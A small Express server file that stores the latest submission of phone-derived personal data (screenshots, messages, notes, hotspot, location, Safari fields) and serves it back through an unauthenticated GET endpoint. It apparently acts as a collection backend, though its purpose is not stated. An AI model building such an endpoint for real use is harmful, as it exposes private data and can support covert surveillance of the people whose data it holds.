const express = require('express');
const app = express();

// 15mb is plenty for two base64 screenshots plus standard text fields
app.use(express.json({ limit: '15mb' }));

let latestSubmission = {
    personal_info_b64: null,
    phone_number_b64: null,
    notes: null,
    messages: null,
    hotspot: null,
    location: null,
    safari: null,
    timestamp: null
};

app.post('/api/submit', (req, res) => {
    try {
        const {
            personal_info_b64,
            phone_number_b64,
            notes,
            messages,
            hotspot,
            location,
            safari
        } = req.body;

        if (
            !personal_info_b64 ||
            !phone_number_b64 ||
            notes === undefined ||
            messages === undefined ||
            hotspot === undefined ||
            location === undefined ||
            safari === undefined
        ) {
            return res.status(400).json({
                success: false,
                error: 'Missing required fields'
            });
        }

        latestSubmission = {
            personal_info_b64,
            phone_number_b64,
            notes,
            messages,
            hotspot,
            location,
            safari,
            timestamp: Date.now()
        };

        return res.status(200).json({ success: true, message: 'Stored!' });
    } catch (error) {
        return res.status(500).json({ success: false, error: 'Server error' });
    }
});

app.get('/api/latest', (req, res) => {
    if (!latestSubmission.personal_info_b64) {
        return res.status(404).json({ success: false, error: 'No data yet' });
    }
    return res.status(200).json({
        success: true,
        personal_info_b64: latestSubmission.personal_info_b64,
        phone_number_b64: latestSubmission.phone_number_b64,
        notes: latestSubmission.notes,
        messages: latestSubmission.messages,
        hotspot: latestSubmission.hotspot,
        location: latestSubmission.location,
        safari: latestSubmission.safari,
        timestamp: latestSubmission.timestamp
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
